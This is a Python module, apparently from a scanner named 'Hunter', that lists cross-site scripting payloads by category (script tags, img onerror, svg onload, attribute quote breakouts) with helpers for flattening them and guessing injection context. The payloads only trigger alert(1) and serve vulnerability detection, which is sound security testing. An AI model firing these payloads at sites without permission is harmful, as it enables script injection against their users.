"""XSS Payloads for Hunter"""

from typing import Dict, List


# XSS payloads organized by category
# OPTIMIZED: Only most effective payloads for fast detection
XSS_PAYLOADS: Dict[str, List[str]] = {
    "basic": [
        "<script>alert(1)</script>",      # Classic script tag
        "<img src=x onerror=alert(1)>",   # Image onerror
        "<svg onload=alert(1)>",          # SVG onload
    ],
    "img": [
        "<img src=x onerror=alert(1)>",   # Duplicate for form testing
    ],
    "event_handlers": [
        "\" onmouseover=alert(1) \"",      # Quote breakout
        " onfocus=alert(1) autofocus ",   # Autofocus trick
    ]
}


def get_payloads(category: str) -> List[str]:
    """Get payloads for a specific category"""
    return XSS_PAYLOADS.get(category, [])


def get_all_payloads() -> List[str]:
    """Get all payloads flattened"""
    all_payloads = []
    for category_payloads in XSS_PAYLOADS.values():
        all_payloads.extend(category_payloads)
    return list(dict.fromkeys(all_payloads))


def is_event_handler_payload(payload: str) -> bool:
    """Check if payload uses event handlers"""
    event_handlers = ['onerror', 'onload', 'onmouseover', 'onfocus', 'onclick', 
                      'onstart', 'ontoggle', 'onchange']
    payload_lower = payload.lower()
    return any(eh in payload_lower for eh in event_handlers)


def get_context_for_payload(payload: str) -> str:
    """Determine the XSS context for a payload"""
    if '<script>' in payload.lower():
        return 'script'
    elif '<img' in payload.lower() or '<svg' in payload.lower():
        return 'html'
    elif 'javascript:' in payload.lower():
        return 'url'
    elif 'on' in payload.lower() and any(eh in payload.lower() for eh in ['onerror', 'onload']):
        return 'attribute'
    else:
        return 'html'
